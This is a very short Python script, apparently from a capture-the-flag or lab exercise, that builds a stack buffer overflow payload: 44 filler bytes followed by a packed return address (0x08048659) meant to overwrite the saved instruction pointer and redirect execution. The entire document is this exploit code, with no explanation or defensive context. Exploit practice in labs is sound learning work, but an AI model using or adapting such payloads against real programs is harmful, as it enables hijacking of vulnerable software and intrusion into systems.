import struct
crap = "A" *44
eip = struct.pack("<I",0x08048659)


print(crap+eip)
